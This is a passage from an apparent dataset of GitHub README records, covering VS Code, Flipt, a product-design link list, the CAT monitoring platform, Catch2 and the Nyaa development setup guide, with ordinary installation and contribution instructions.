\u7531\u672c\u6587\u6863\u884d\u751f\u7684\u4e13\u4e3a\u9762\u8bd5\u800c\u751f\u7684\u300aJava\u9762\u8bd5\u7a81\u51fb\u300bV2.0 PDF \u7248\u672c\u516c\u4f17\u53f7\u540e\u53f0\u56de\u590d \"Java\u9762\u8bd5\u7a81\u51fb\" \u5373\u53ef\u514d\u8d39\u9886\u53d6\uff01\nJava\u5de5\u7a0b\u5e08\u5fc5\u5907\u5b66\u4e60\u8d44\u6e90: \u4e00\u4e9bJava\u5de5\u7a0b\u5e08\u5e38\u7528\u5b66\u4e60\u8d44\u6e90\u516c\u4f17\u53f7\u540e\u53f0\u56de\u590d\u5173\u952e\u5b57 \u201c1\u201d \u5373\u53ef\u514d\u8d39\u65e0\u5957\u8def\u83b7\u53d6\u3002"}, {"title": "microsoft/vscode", "language": "TypeScript", "content": "Visual Studio Code - Open Source\n\n\n\n\nVS Code is a type of tool that combines the simplicity of\na code editor with what developers need for their core edit-build-debug cycle. It provides comprehensive editing and debugging support, an extensibility model, and lightweight integration with existing tools.\nVS Code is updated monthly with new features and bug fixes. You can download it for Windows, macOS, and Linux on VS Code's website. To get the latest releases every day, you can install the Insiders version of VS Code. This builds from the master branch and is updated daily at the very least.\n\n\n\nThe vscode repository is where VS Code is developed and there are many ways in which you can participate in the project, for example:\n\nSubmit bugs and feature requests and help us verify as they are checked in.\nReview source code changes.\nReview the documentation and make pull requests for anything from typos to new content.\n\nContributing\nIf you are interested in fixing issues and contributing directly to the code base,\nplease see the document How to Contribute, which covers the following:\n\nHow to build and run from source\nThe development workflow, including debugging and running tests\nCoding Guidelines\nSubmitting pull requests\nContributing to translations\n\nPlease also see our Code of Conduct.\nFeedback\n\nAsk a question on Stack Overflow.\nRequest a new feature on GitHub.\nVote for Popular Feature Requests.\nFile a bug in GitHub Issues.\nTweet us with any other feedback.\n\nRelated Projects\nMany of the core components and extensions to Code live in their own repositories on GitHub. For example, the node debug adapter and the mono debug adapter have their own repositories.\nFor a complete list, please visit the Related Projects page on our wiki.\nBundled Extensions\nCode ships with a set of extensions. These extensions are located in the extensions folder.\nThese extensions include grammars and snippets for several languages. Extensions that provide rich language support (code completion, go to definition) for a language have the suffix 'language-features'. For example, the 'json' extension provides coloring for JSON and the 'json-language-features' provides rich language support for JSON.\nLicense\nCopyright (c) Microsoft Corporation. All rights reserved.\nLicensed under the MIT License."}, {"title": "markphelps/flipt", "language": "Go", "content": "A feature flag solution that runs in your existing infrastructure\n\n\n\n\n\n\n\n\nDocumentation\nhttps://flipt.dev/\nWhat is Flipt\nFlipt is an open source feature flag application that allows you to run experiments across services in your environment.\nThis means that you can deploy Flipt within your existing infrastructure and not have to worry about your information being sent to a third party or the latency required to communicate across the internet.\nFlipt includes native client SDKs as well as a REST API so you can choose how to best integrate Flipt with your applications.\nFlipt Features\nFlipt enables you to add feature flag support to your existing applications, with a simple, single UI and API.\nThis can range from simple on/off feature flags to more advanced use cases where you want to be able to rollout different versions of a feature to percentages of your users.\nFlipt features include:\n\nFast. Written in Go. Optimized for performance\nStand alone, easy to run server with no external dependencies\nAbility to create advanced distribution rules to target segments of users\nNative GRPC client SDKs to integrate with your applications\nSimple REST API\nModern UI and debug console\n\nWhy Flipt\nFlipt allows you to focus on building your applications without having to worry about implementing your own feature flag solution that works across your infrastructure.\nOn top of this, Flipt provides a nice, modern UI so that you can always monitor the state of your feature flags and experiments in a single place.\nRunning Flipt\nFlipt is a single, self contained binary that you run on your own servers or cloud infrastructure. There are a multitude of benefits to running Flipt yourself, including:\n\n\ud83d\udd12 Security - No data leaves your servers and you don't have to open your systems to the outside world to communicate with Flipt. It all runs within your existing infrastructure.\n\ud83d\ude80 Speed - Since Flipt is co-located with your existing services, you do not have to communicate across the internet to another application running on the other side of the world which can add excessive latency and slow down your applications.\n\u2705 Simplicity - Flipt is a single binary with no external dependencies. This means there is no database server to manage or connect to, no clusters to configure, and data backup is as simple as copying a single file.\n\nTry It\n\u276f docker run --rm -p 8080:8080 -p 9000:9000 markphelps/flipt:latest\nFlipt UI will now be reachable at http://localhost:8080/.\nFor more permanent methods of running Flipt, see the Installation section.\nLicensing\nThere are currently two types of licenses in place for Flipt:\n\nClient License\nServer License\n\nClient License\nAll of the code required to generate GRPC clients in other languages as well as the existing GRPC Go client are licensed under the MIT License.\nThis code exists in the rpc/ directory.\nThe client code is the code that you would integrate into your applications, which is why a more permissive license is used.\nServer License\nThe server code is licensed under the GPL 3.0 License.\nIf there are any concerns about the use of this license for the server, please open an issue on GitHub so that we can discuss publicly.\nAuthor\n\nWebsite: https://markphelps.me\nTwitter: @mark_a_phelps\nEmail: mark.aaron.phelps at gmail.com\n\nContributing\nI would love your help! Before submitting a PR, please read over the Contributing guide.\nOr if you would like to support the continued development of Flipt, you could always Buy Me A Coffee!\n\nPro Version\nMy plan is to soon start working on a Pro Version of Flipt for enterprise. Along with support, some of the planned features include:\n\nUser management/permissions\nMultiple environments\nAudit log\nStreaming updates\nMetrics\nHA support\n\nIf you or your organization would like to help beta test a Pro version of Flipt, please get in touch with me:\n\nTwitter: @mark_a_phelps\nEmail: mark.aaron.phelps at gmail.com"}, {"title": "teoga/awesome-product-design", "language": "Go", "content": "Awesome Product Design \n\n\n\n\nA collection of bookmarks, resources, articles for product designers.\n\nDigital product design is an iterative design process to solve a functional problem with a formal solution. A digital product designer identifies a real problem, offers the best possible solution, and launch it to a market that is showing demand for that particular solution.\nFeel free to add something interesting by pull request.\nContents\n\nResearch\nUX\nUI\nVisual\nPrototype\nAccessibility\nWriting\nData\nIoT\n\nResearch\nMethods\nResearch Plan\n\nSmashing Magazine - The UX Research Plan That Stakeholders Love.\nNN Group - Project Management for User Research: The Plan.\nInteraction Design - One Page User Research Plan.\n\nUser Interview\n\nNN Group - Despite many weaknesses, interviews are a valuable method for exploratory user research.\nUXDesign.cc - How to Get the Most Out of User Interviews.\n\nStakeholder Interviews\n\nBoxes and Arrows - Cheat Sheet For Interviewing Stakeholders.\nUX Apprentice - Stakeholder Interview Template.\nInteraction Design - Preparing for UX Stakeholder Interviews.\n\nResearch Synthesis\n\nUX Movement - How to Turn User Research into Usable Data.\nSlideShare - Design Research Synthesis.\nMedium - Using Trello for User Research Synthesis.\nTuts+ - How to Prepare and Use an Affinity Diagram.\nMedium - Affinity Diagrams: Tips and Tricks.\n\nCompetitive Analysis\n\nXtensio - How To: Create A Competitive Analysis.\nHootsuite - Competitive Analysis Template To Help You Outsmart The Competition.\n\nJob to be Done\n\nIntercom - Designing features using Job Stories.\nJTBD - Replacing The User Story With The Job Story.\n\nPersonas\n\nUsability.Gov - The purpose of personas is to create reliable and realistic representations of your key audience.\nUX Mag - Personas: The Foundation of a Great User Experience.\nTuts+ - Defining And Applying Personas to UX Design.\n\nEmpathy Map\n\nUX Pin - The Practical Guide to Empathy Maps: 10-Minute User Personas.\nBoagworld - Adapting empathy maps for UX design.\n\nStoryboard\n\nUX Magazine - Storyboarding in the Software Design Process.\nMedium - Storyboarding in UX Design.\nJohnny Holland - Storyboarding & UX.\nNN Group - When and How to Create Customer Journey Maps.\nUX Lady - Experience maps, user journeys and more.\nSmashing Magazine - All You Need To Know About Customer Journey Mapping.\nMedium - How to build an experience map.\n\nArticles\n\nSmashing Magazine - The Rainbow Spreadsheet: A Collaborative Lean UX Research Tool.\nCoglode - Bite-size behavioral research analysis.\n\nTesting\n\nUser Testing - Unlock customer insights and increase your revenue.\nOptimal Workshop - User Research Platform that helps you and your team make design decisions with confidence.\nMeasure Success - How Do You Measure the Success (or Failure) - of Your UX Design?.\nUX Metrix - How to Choose the Right UX Metrics for Your Product.\nLookback - Simple, powerful user research.\nAppsee - Appsee's app analytics platform provides an in-depth analysis of your users' behavior.\nFull Story - What do you want to know about your customer experience?.\nDesinion - Make smart and informed design decisions for your company, or your client's company.\nSurvey Monkey - Turn instincts into insights.\nGoogle Surveys - Make better decisions with market research.\nTypefrom - Goodbye forms. Hello typeforms.\nEtnio - Intercept Real People for User Research.\nCalendly - Calendly helps you schedule meetings without the back-and-forth emails.\n\nUX\nGuidelines\n\nThe UX Bookmark - Collection of the best UX websites from across the globe.\nGov.Uk - Helping government teams create and run great digital services.\nMethods 18F - Collection of tools to bring human-centered design into your project.\nGuides 18F - 18F Guides is the repository for best practices across our teams.\nUsability.Gov - Improving the User Experience.\nMedial Lab Amsterdam - Design method toolkit.\nDesign Kit IDEO - Step-by-step guide to unleashing your creativity.\nGamestorming - Gamestorming is a set of co-creation tools used by innovators around the world.\n\nArticles\n\nUX Magazine - UX Magazine is a free community resource exploring all facets of experience design.\nUX Both - The UX Booth is a publication by and for the user experience community.\nUX Mastery - We help user experience professionals get started and get better.\nUX Myths - Build your product based on evidence, not false beliefs.\nA List Apart - List Apart explores the design, development, and meaning of web content.\n52 Weeks of UX - Discourse on the process of designing for real people.\nUX Pin - Guides, articles and ebooks that explore all facets of UX Design.\nThe IxD Library - Collection of materials related to Interaction Design.\nLukeW - Publications on the critical details and big picture behind digital product design.\nNN Group - Evidence-Based User Experience Research, Training, and Consulting.\nCooper - Blog about design, business, and the world we live in.\nInformation Design - InfoDesign Hand-picked since 1997.\nIntercom - Design, Customer Success, & Startup Blog.\nUXDesign.cc - User Experience, Usability, Product Design. Follow the UXDesign.cc.\nUX Reactions - Fun stuff.\n\nTools\n\nUX Recipe - This project is a personal manifesto against the objectification of the term \"UX\".\nUX Checklist - UX Project Checklist.\nUX Stackexchange - UX Stack Exchange is a question and answer site.\n\nUI\nGuidelines\n\niOS Guidelines - Get in-depth information and UI resources for designing great apps that integrate seamlessly with Apple platforms.\nGoogle Material - Material Design is a unified system that combines theory, resources, and tools for crafting digital experiences.\nGoogle Design - Google Design is a cooperative effort led by a group of designers, writers, and developers at Google.\nFacebook Design - Collection of articles, videos, and resources made by designers at Facebook.\nUsTwo - Pixel Perfect Precision Handbook 3.\nVinsol - Tips for Designers: from a Developer.\n\nInspiration\n\nPttrns - The mother of all design resources.\nCall To Idea - Light up your imagination!.\nAndroid Niceties - Aiming to provide inspiration and insight into Android UI conventions.\nLovely UI - Collection of mobile UI elements.\nBrian Lovin - Visual exploration of the best products.\nGreat Apps Timeline - See how the LOOK of some of the great apps changed over time.\nInspired UI - iOS Mobile Apps Design Patterns.\nSloppy UI - It's all about intellectual honesty, not trolling.\n\nTools\n\nPattern Lab - Create atomic design systems with Pattern Lab.\nHuge - Tool to make creating and maintaining styleguides easy.\nStylify Me - This tool allows the designer to research sites efficiently without the need to inspect each element.\nDensity Bucket - Density Converter.\niDetailAid - Android DP / PX converter.\n\nVisual\nResources\n\nDesign Principles FTW - The biggest collection of Design Principles on the Internet.\nFind Guidelines - The fastest way to brand assets.\nStyle Guides - Website Style Guide Resources.\nAwesome Design Systems - Curated list of design systems, patterns libraries, and everything in between.\nInstant Logo Search - Search & download thousands of logos instantly.\nLogo Book - Discover the worlds finest logos, symbols & trademarks.\nAwesome Sketch - Curated list of awesome Sketch videos, articles, plugins, whatever, for designers, developers, or neither.\n\nIcons\n\nUse Iconic - Meet Iconic. The definitive icon set designed for the modern web.\nIcon Finder - Search through 1,739,045 icons or browse 42,226 icon sets.\nWe Love Icon Font - This is a free & open source icon fonts hosting service.\nThe Noun Project - Icons for everything.\nIconmonstr - Discover 3847+ free simple icons in 263 collections.\n\nFont Foundries\n\nOpen Foundry - New platform for open-source fonts in a noise-free environment.\nUse & Modify - Provide a contemporary set of fonts distributed under libre or open source licences, hand picked by a typography and free culture lover.\nFont Fabric - Fontfabric is an independent type foundry.\nFont Squirrel - Free Font Utopia.\nPlay Type - Browse through our selection of more than a hundred fonts and nearly 500 different font weights.\nIdentyfont - Identify a font by answering questions about key features.\n\nColors\n\nCoolors - The super fast color schemes generator!.\nColour Lovers - Creative community.\nColor Hunt - Color Hunt is a social platform for everyone who love colors.\nBrand Colors - 1100+ color collection available in sass, less, stylus and css.\n\nStock Images\n\nUnsplash - Free (do whatever you want) - high-resolution photos.\nStockSnap - Hundreds of high resolution images added weekly.\nPixbay - Free images and videos you can use anywhere.\nJay Mantry - Free pics (CC0).\nThe Stock - The best royalty free stock photos are delivered now along with videos, audios, icons, fonts and colors.\nGet Refe - Royalty-free, high-quality, Real Life photos.\nISO Republic - ISO Republic provides free stock photos for creative professionals.\nAll The Free Stock - Get all the Free Stock Images, Videos, Music and Icons in one location.\nPexels - Free stock images in a range of styles including filtered, natural, and commercial.\n\nStock Videos\n\nVimeo - Royalty Free Stock Video for Free Personal, Corporate or Commercial Use.\n\nTools\n\nPattern Lab - Create atomic design systems with Pattern Lab.\nPolar - Photo Editor.\nLicecap - Simple animated screen captures.\nHand Brake - HandBrake is a tool for converting video from nearly any format to a selection of modern, widely supported codecs.\nSkala Color - Extraordinary color picker for designers and developers.\nFont Picker - Webfont library for your browser.\nFont Reach - FontReach scans the top million sites to show font usage across the web.\n\nPrototype\nArticles\n\nThe 12 Principles - The 12 basic principles of animation were developed by the \u2018old men\u2019 of Walt Disney Studios.\nHoverstat - The home of alternative digital design.\nMicrointeractions - Designing with Details.\nMotion UI Design - Resources for inspiration, lists of software, libraries and other stuff related to Motion UI design, animations and transitions.\n\nSoftwares\n\nPop - POP helps you transform your pen and paper ideas into an interactive iPhone or Android prototype.\nInvision - The world's leading prototyping, collaboration & workflow platform.\nMarvel - Simple design, prototyping and collaboration.\nFlinto - Flinto lets designers quickly make interactive prototypes of their mobile, desktop, or web apps.\nOrigami Studio - Explore, iterate, and test your ideas.\nFramer - All-in-one design workflow.\nForm - Build and customize native prototypes directly on device.\nProto - Create fully-interactive high-fidelity prototypes that look and work exactly like your app should. No coding required.\nFuse - Create better native apps for iOS and Android with a new breed of development tools.\n\nTools\n\nLottie - Easily add high-quality animation to any native app.\nKeynotopia - Keynotopia transforms Keynote and PowerPoint into the best rapid prototyping tools for creating mobile, web and desktop UI mockups.\n\nAccessibility\nArticles\n\nGov.Uk - Making your service accessible: an introduction.\nSmashing Magazine - Color Contrast And Why You Should Rethink It.\nMedium - Accessibility for designers. Mind your RGB\u2019s.\nWeb Credible - Visual design and color accessibility.\nA List Apart - Easy Color Contrast Testing.\nViget - Color Contrast for Better Readability.\n\nTools\n\nWAVE - Web Accessibility Evaluation Tool.\nContrast Ratio - Aool to calculate the contrast ratio between any two valid CSS colors.\nSnook - Colour Contrast Check.\nCanvasFlip - Colorblind simulator for Designers.\n\nWriting\n\nGoogle trends - Stories trending now.\nGoogle Ngram - Enter phrases into the Google Books Ngram Viewer, it displays a graph showing how those phrases have occurred in a corpus of books.\nHemingway - Hemingway App makes your writing bold and clear.\nReadable - You have 7 seconds to grab someone's attention. Readable.io helps you cut out the noise.\nThe Writer - How readable is your writing?.\n\nData\n\nLondon Datastore - The London Datastore is a free and open data-sharing portal.\nYouGov - We believe in the power of participation.\nData.Gov - Find data published by government departments and agencies, public bodies and local authorities.\nThe Tate Collection - Here we present the metadata for around 70,000 artworks.\nNASA - We're Setting Data, Code and APIs free.\n\nIoT\nArticles\n\nIoT Manifesto - Guidelines for responsible design in a connected world.\nIoT Weekly News - Subscribe to hand picked articles by Justin Grammens on the Internet of Things.\nIoT Agenda - Design an IoT user experience, not an IoT product.\nIoT For All - Designing the Internet of Things \u2013 5 Key Principles.\n\nTools\n\nNode RED - Flow-based programming for the Internet of Things.\nNoodl - Digital Experience Design Platform.\n\nLicense"}, {"title": "dianping/cat", "language": "Java", "content": "CAT\n\n\nCAT \u7b80\u4ecb\n\nCAT \u662f\u57fa\u4e8e Java \u5f00\u53d1\u7684\u5b9e\u65f6\u5e94\u7528\u76d1\u63a7\u5e73\u53f0\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u63d0\u4f9b\u4e86\u5168\u9762\u7684\u5b9e\u65f6\u76d1\u63a7\u544a\u8b66\u670d\u52a1\u3002\nCAT \u4f5c\u4e3a\u670d\u52a1\u7aef\u9879\u76ee\u57fa\u7840\u7ec4\u4ef6\uff0c\u63d0\u4f9b\u4e86 Java, C/C++, Node.js, Python, Go \u7b49\u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff0c\u5df2\u7ecf\u5728\u7f8e\u56e2\u70b9\u8bc4\u7684\u57fa\u7840\u67b6\u6784\u4e2d\u95f4\u4ef6\u6846\u67b6\uff08MVC\u6846\u67b6\uff0cRPC\u6846\u67b6\uff0c\u6570\u636e\u5e93\u6846\u67b6\uff0c\u7f13\u5b58\u6846\u67b6\u7b49\uff0c\u6d88\u606f\u961f\u5217\uff0c\u914d\u7f6e\u7cfb\u7edf\u7b49\uff09\u6df1\u5ea6\u96c6\u6210\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u5404\u4e1a\u52a1\u7ebf\u63d0\u4f9b\u7cfb\u7edf\u4e30\u5bcc\u7684\u6027\u80fd\u6307\u6807\u3001\u5065\u5eb7\u72b6\u51b5\u3001\u5b9e\u65f6\u544a\u8b66\u7b49\u3002\nCAT \u5f88\u5927\u7684\u4f18\u52bf\u662f\u5b83\u662f\u4e00\u4e2a\u5b9e\u65f6\u7cfb\u7edf\uff0cCAT \u5927\u90e8\u5206\u7cfb\u7edf\u662f\u5206\u949f\u7ea7\u7edf\u8ba1\uff0c\u4f46\u662f\u4ece\u6570\u636e\u751f\u6210\u5230\u670d\u52a1\u7aef\u5904\u7406\u7ed3\u675f\u662f\u79d2\u7ea7\u522b\uff0c\u79d2\u7ea7\u5b9a\u4e49\u662f48\u5206\u949f40\u79d2\uff0c\u57fa\u672c\u4e0a\u770b\u523048\u5206\u949f38\u79d2\u6570\u636e\uff0c\u6574\u4f53\u62a5\u8868\u7684\u7edf\u8ba1\u7c92\u5ea6\u662f\u5206\u949f\u7ea7\uff1b\u7b2c\u4e8c\u4e2a\u4f18\u52bf\uff0c\u76d1\u63a7\u6570\u636e\u662f\u5168\u91cf\u7edf\u8ba1\uff0c\u5ba2\u6237\u7aef\u9884\u8ba1\u7b97\uff1b\u94fe\u8def\u6570\u636e\u662f\u91c7\u6837\u8ba1\u7b97\u3002\n\nCat \u4ea7\u54c1\u4ef7\u503c\n\n\u51cf\u5c11\u6545\u969c\u53d1\u73b0\u65f6\u95f4\n\u964d\u4f4e\u6545\u969c\u5b9a\u4f4d\u6210\u672c\n\u8f85\u52a9\u5e94\u7528\u7a0b\u5e8f\u4f18\u5316\n\nCat \u4f18\u52bf\n\n\u5b9e\u65f6\u5904\u7406\uff1a\u4fe1\u606f\u7684\u4ef7\u503c\u4f1a\u968f\u65f6\u95f4\u9510\u51cf\uff0c\u5c24\u5176\u662f\u4e8b\u6545\u5904\u7406\u8fc7\u7a0b\u4e2d\n\u5168\u91cf\u6570\u636e\uff1a\u5168\u91cf\u91c7\u96c6\u6307\u6807\u6570\u636e\uff0c\u4fbf\u4e8e\u6df1\u5ea6\u5206\u6790\u6545\u969c\u6848\u4f8b\n\u9ad8\u53ef\u7528\uff1a\u6545\u969c\u7684\u8fd8\u539f\u4e0e\u95ee\u9898\u5b9a\u4f4d\uff0c\u9700\u8981\u9ad8\u53ef\u7528\u76d1\u63a7\u6765\u652f\u6491\n\u6545\u969c\u5bb9\u5fcd\uff1a\u6545\u969c\u4e0d\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u8f6c\u3001\u5bf9\u4e1a\u52a1\u900f\u660e\n\u9ad8\u541e\u5410\uff1a\u6d77\u91cf\u76d1\u63a7\u6570\u636e\u7684\u6536\u96c6\uff0c\u9700\u8981\u9ad8\u541e\u5410\u80fd\u529b\u505a\u4fdd\u8bc1\n\u53ef\u6269\u5c55\uff1a\u652f\u6301\u5206\u5e03\u5f0f\u3001\u8de8 IDC \u90e8\u7f72\uff0c\u6a2a\u5411\u6269\u5c55\u7684\u76d1\u63a7\u7cfb\u7edf\n\n\u66f4\u65b0\u65e5\u5fd7\n\n\n\u6700\u65b0\u7248\u672c\u7279\u6027\u4e00\u89c8\n\n\n\u6ce8\u610fcat\u76843.0\u4ee3\u7801\u5206\u652f\u66f4\u65b0\u90fd\u53d1\u5e03\u5728master\u4e0a\uff0c\u5305\u62ec\u6700\u65b0\u6587\u6863\u4e5f\u90fd\u662f\u8fd9\u4e2a\u5206\u652f\n\n\n\u6ce8\u610f\u6587\u6863\u8bf7\u7528\u6700\u65b0master\u91cc\u9762\u7684\u4ee3\u7801\u6587\u6863\u4f5c\u4e3a\u6807\u51c6\uff0c\u4e00\u4e9b\u5f00\u6e90\u7f51\u7ad9\u4e0a\u9762\u4e00\u4e9b\u8001\u7248\u672c\u7684\u4e00\u4e9b\u914d\u7f6e\u5305\u62ec\u6570\u636e\u5e93\u7b49\u53ef\u80fd\u9047\u5230\u4e0d\u517c\u5bb9\u60c5\u51b5\uff0c\u8bf7\u4ee5master\u4ee3\u7801\u4e3a\u51c6\uff0c\u8fd9\u4efd\u6587\u6863\u90fd\u662f\u7f8e\u56e2\u70b9\u8bc4\u5185\u90e8\u540c\u5b66\u4e3a\u8fd9\u4e2a\u7248\u672c\u7edf\u4e00\u6574\u7406\u6c47\u603b\u3002\u5185\u90e8\u540c\u5b66\u5df2\u7ecf\u6838\u5bf9\uff0c\u5305\u62ec\u4e5f\u9a8c\u8bc1\u8fc7\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e9b\u770b\u4e0d\u61c2\uff0c\u6216\u8005\u6a21\u7cca\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u63d0\u4ea4PR\u3002\n\n\n\u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff1aJava\u3001C/C++\u3001Node.js\u3001Python\u3001Go \u4f20\u9001\u95e8\n\nJava\nC\nC++\nPython\nGo\nNode.js\n\n\n\n\u6d88\u606f\u91c7\u6837\u805a\u5408\n\n\n\u5e8f\u5217\u5316\u534f\u8bae\u5347\u7ea7\n\n\n\u5168\u65b0\u6587\u4ef6\u5b58\u50a8\u5f15\u64ce\n\n\n\n\n\u76d1\u63a7\u6a21\u578b\uff1a\n\u652f\u6301 Transaction\u3001Event\u3001Heartbeat\u3001Metric \u56db\u79cd\u6d88\u606f\u6a21\u578b\u3002 \u6a21\u578b\u8bbe\u8ba1\n\u6a21\u5757\u7b80\u4ecb\n\u529f\u80fd\u6a21\u5757\n\ncat-client: \u5ba2\u6237\u7aef\uff0c\u4e0a\u62a5\u76d1\u63a7\u6570\u636e\ncat-consumer: \u670d\u52a1\u7aef\uff0c\u6536\u96c6\u76d1\u63a7\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\u5206\u6790\uff0c\u6784\u5efa\u4e30\u5bcc\u7684\u7edf\u8ba1\u62a5\u8868\ncat-alarm: \u5b9e\u65f6\u544a\u8b66\uff0c\u63d0\u4f9b\u62a5\u8868\u6307\u6807\u7684\u76d1\u63a7\u544a\u8b66\ncat-hadoop: \u6570\u636e\u5b58\u50a8\uff0clogview \u5b58\u50a8\u81f3 Hdfs\ncat-home: \u7ba1\u7406\u7aef\uff0c\u62a5\u8868\u5c55\u793a\u3001\u914d\u7f6e\u7ba1\u7406\u7b49\n\n\n\n\u6839\u76ee\u5f55\u4e0b cat-client \u6a21\u5757\u4ee5\u540e\u4e0d\u518d\u7ef4\u62a4\uff0c\u4e0b\u4e2a\u5927\u7248\u672c\u66f4\u65b0\u8ba1\u5212\u79fb\u9664\u3002\u65b0\u7248Java\u5ba2\u6237\u7aef\u53c2\u8003\uff1alib/java\n\u7ba1\u7406\u7aef\u3001\u670d\u52a1\u7aef\u3001\u544a\u8b66\u670d\u52a1\u5747\u4f7f\u7528 cat-home \u6a21\u5757\u90e8\u7f72\u5373\u53ef\n\n\n\u5176\u4ed6\u6a21\u5757\n\nintegration\uff1acat\u548c\u4e00\u4e9b\u7b2c\u4e09\u65b9\u5de5\u5177\u96c6\u6210\u7684\u5185\u5bb9\uff08\u6b64\u90e8\u5206\u4e00\u90e8\u5206\u662f\u7531\u793e\u533a\u8d21\u732e\uff0c\u4e00\u90e8\u5206\u5b98\u65b9\u8d21\u732e\uff09\nlib\uff1aCAT \u7684\u5ba2\u6237\u7aef\uff0c\u5305\u62ec Java\u3001C/C++\u3001Python\u3001Node.js\u3001Go\nscript\uff1aCAT \u6570\u636e\u5e93\u811a\u672c\n\nQuick Start\n\n\u90e8\u7f72FAQ\n\n\u670d\u52a1\u7aef\n\n\u96c6\u7fa4\u90e8\u7f72\n\u62a5\u8868\u4ecb\u7ecd\n\u914d\u7f6e\u624b\u518c\n\n\u9879\u76ee\u8bbe\u8ba1\n\n\u9879\u76ee\u67b6\u6784\n\u5ba2\u6237\u7aef\u8bbe\u8ba1\n\u670d\u52a1\u7aef\u8bbe\u8ba1\n\u6a21\u578b\u8bbe\u8ba1\n\nCopyright and License\nApache 2.0 License.\nCAT \u63a5\u5165\u516c\u53f8\n\n\u66f4\u591a\u63a5\u5165\u516c\u53f8\uff0c\u6b22\u8fce\u5728 https://github.com/dianping/cat/issues/753 \u767b\u8bb0\n\u8054\u7cfb\u6211\u4eec\n\u6211\u4eec\u9700\u8981\u77e5\u9053\u4f60\u5bf9Cat\u7684\u4e00\u4e9b\u770b\u6cd5\u4ee5\u53ca\u5efa\u8bae\uff1a\n\nMail: cat@dianping.com\uff0c\nIssues"}, {"title": "catchorg/Catch2", "language": "C++", "content": "The latest version of the single header can be downloaded directly using this link\nCatch2 is released!\nIf you've been using an earlier version of Catch, please see the\nBreaking Changes section of the release notes\nbefore moving to Catch2. You might also like to read this blog post for more details.\nWhat's the Catch?\nCatch2 stands for C++ Automated Test Cases in a Header and is a\nmulti-paradigm test framework for C++. which also supports Objective-C\n(and maybe C).\nIt is primarily distributed as a single header file, although certain\nextensions may require additional headers.\nHow to use it\nThis documentation comprises these three parts:\n\nWhy do we need yet another C++ Test Framework?\nTutorial - getting started\nReference section - all the details\n\nMore\n\nIssues and bugs can be raised on the Issue tracker on GitHub\nFor discussion or questions please use the dedicated Google Groups forum or our Discord\nSee who else is using Catch2"}, {"title": "nyaadevs/nyaa", "language": "Python", "content": "NyaaV2 \nSetting up for development\nThis project uses Python 3.6. There are features used that do not exist in 3.5, so make sure to use Python 3.6.\nThis guide also assumes you 1) are using Linux and 2) are somewhat capable with the commandline.\nIt's not impossible to run Nyaa on Windows, but this guide doesn't focus on that.\nCode Quality:\n\nBefore we get any deeper, remember to follow PEP8 style guidelines and run ./dev.py lint before committing to see a list of warnings/problems.\n\nYou may also use ./dev.py fix && ./dev.py isort to automatically fix some of the issues reported by the previous command.\n\n\nOther than PEP8, try to keep your code clean and easy to understand, as well. It's only polite!\n\nRunning Tests\nThe tests folder contains tests for the the nyaa module and the webserver. To run the tests:\n\nMake sure that you are in the python virtual environment.\nRun ./dev.py test while in the repository directory.\n\nSetting up Pyenv\npyenv eases the use of different Python versions, and as not all Linux distros offer 3.6 packages, it's right up our alley.\n\nInstall dependencies https://github.com/pyenv/pyenv/wiki/Common-build-problems\nInstall pyenv https://github.com/pyenv/pyenv/blob/master/README.md#installation\nInstall pyenv-virtualenv https://github.com/pyenv/pyenv-virtualenv/blob/master/README.md\nInstall Python 3.6.1 with pyenv and create a virtualenv for the project:\n\npyenv install 3.6.1\npyenv virtualenv 3.6.1 nyaa\npyenv activate nyaa\n\n\nInstall dependencies with pip install -r requirements.txt\nCopy config.example.py into config.py\n\nChange SITE_FLAVOR in your config.py depending on which instance you want to host\n\n\n\nSetting up MySQL/MariaDB database\nYou may use SQLite but the current support for it in this project is outdated and rather unsupported.\n\nEnable USE_MYSQL flag in config.py\nInstall latest mariadb by following instructions here https://downloads.mariadb.org/mariadb/repositories/\n\nTested versions: mysql  Ver 15.1 Distrib 10.0.30-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2\n\n\nRun the following commands logged in as your root db user (substitute for your own config.py values if desired):\n\nCREATE USER 'test'@'localhost' IDENTIFIED BY 'test123';\nGRANT ALL PRIVILEGES ON *.* TO 'test'@'localhost';\nFLUSH PRIVILEGES;\nCREATE DATABASE nyaav2 DEFAULT CHARACTER SET utf8 COLLATE utf8_bin;\n\n\n\nFinishing up\n\nRun python db_create.py to create the database and import categories\n\nFollow the advice of db_create.py and run ./db_migrate.py stamp head to mark the database version for Alembic\n\n\nStart the dev server with python run.py\nWhen you are finished developing, deactivate your virtualenv with pyenv deactivate or source deactivate (or just close your shell session)\n\nYou're now ready for simple testing and development!\nContinue below to learn about database migrations and enabling the advanced search engine, Elasticsearch.\nDatabase migrations\n\nDatabase migrations are done with flask-Migrate, a wrapper around Alembic.\nIf someone has made changes in the database schema and included a new migration script:\n\nIf your database has never been marked by Alembic (you're on a database from before the migrations), run ./db_migrate.py stamp head before pulling the new migration script(s).\n\nIf you already have the new scripts, check the output of ./db_migrate.py history instead and choose a hash that matches your current database state, then run ./db_migrate.py stamp <hash>.\n\n\nUpdate your branch (eg. git fetch && git rebase origin/master)\nRun ./db_migrate.py upgrade head to run the migration. Done!\n\n\nIf you have made a change in the database schema:\n\nSave your changes in models.py and ensure the database schema matches the previous version (ie. your new tables/columns are not added to the live database)\nRun ./db_migrate.py migrate -m \"Short description of changes\" to automatically generate a migration script for the changes\n\nCheck the script (migrations/versions/...) and make sure it works! Alembic may not able to notice all changes.\n\n\nRun ./db_migrate.py upgrade to run the migration and verify the upgrade works.\n\n(Run ./db_migrate.py downgrade to verify the downgrade works as well, then upgrade again)\n\n\n\n\n\nSetting up and enabling Elasticsearch\nInstalling Elasticsearch\n\nInstall JDK with sudo apt-get install openjdk-8-jdk\nInstall Elasticsearch\n\nFrom packages...\n\nEnable the service:\n\nsudo systemctl enable elasticsearch.service\nsudo systemctl start elasticsearch.service\n\n\n\n\nor simply extracting the archives and running the files, if you don't feel like permantently installing ES\n\n\nRun curl -XGET 'localhost:9200' and make sure ES is running\n\nOptional: install Kibana as a search debug frontend for ES\n\n\n\nEnabling 